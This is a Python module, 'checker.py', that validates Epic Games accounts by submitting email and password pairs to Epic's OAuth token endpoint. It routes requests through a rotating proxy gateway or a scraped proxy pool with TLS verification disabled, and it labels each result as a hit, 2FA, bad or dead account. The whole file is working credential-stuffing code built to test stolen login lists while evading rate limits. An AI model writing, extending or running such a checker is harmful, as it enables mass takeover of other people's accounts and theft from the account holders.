"""
checker.py — Epic Games account validator
Session-per-thread via threading.local() — no fresh connection per call.

Proxy priority:
  1. ghostproxies.net gateway  (if GHOST_KEY is set in config)
  2. Manual proxy pool          (if proxies loaded via /proxy or /scrapeproxy)
  3. Direct (no proxy)
"""
import threading
import requests
import urllib3

from config     import EPIC_TOKEN_URL, EPIC_HEADERS, ERR_MAP, TIMEOUT, \
                       GHOST_KEY, GHOST_USER, GHOST_HOST
from proxy_pool import pool as proxy_pool

urllib3.disable_warnings()

# one Session object per thread — reuses TCP connections
_local = threading.local()


def _session() -> requests.Session:
    if not hasattr(_local, "s"):
        s = requests.Session()
        s.headers.update(EPIC_HEADERS)
        s.verify = False
        _local.s = s
    return _local.s


def _get_proxy() -> str | None:
    """
    Return the proxy URL to use for this request.
    ghostproxies.net gateway takes priority over the manual pool.
    """
    if GHOST_KEY and GHOST_KEY != "PASTE_YOUR_KEY_HERE":
        # gateway rotates IPs server-side — no pool needed
        return f"http://{GHOST_USER}:{GHOST_KEY}@{GHOST_HOST}"
    return proxy_pool.next()   # None if pool is empty → direct


def check_epic(email: str, password: str) -> str:
    """
    Attempt login via Epic Games OAuth.
    Returns: HIT | 2FA | BAD | DEAD | RETRY | ERROR
    """
    proxy   = _get_proxy()
    proxies = {"http": proxy, "https": proxy} if proxy else None

    try:
        r = _session().post(
            EPIC_TOKEN_URL,
            data={
                "grant_type": "password",
                "username":   email,
                "password":   password,
                "token_type": "eg1",
            },
            proxies=proxies,
            timeout=TIMEOUT,
        )

        # must be JSON — anything else is a fake response from a dead proxy
        ct = r.headers.get("content-type", "")
        if not ct.startswith("application/json"):
            return "ERROR"

        body = r.json()

        if r.status_code == 200:
            # verify it's a real Epic token, not a proxy captive portal page
            if "access_token" in body and "account_id" in body:
                return "HIT"
            return "ERROR"   # fake 200 from captive portal

        err = body.get("errorCode", "")
        return ERR_MAP.get(err, "ERROR")

    except requests.exceptions.Timeout:
        return "ERROR"
    except Exception:
        return "ERROR"
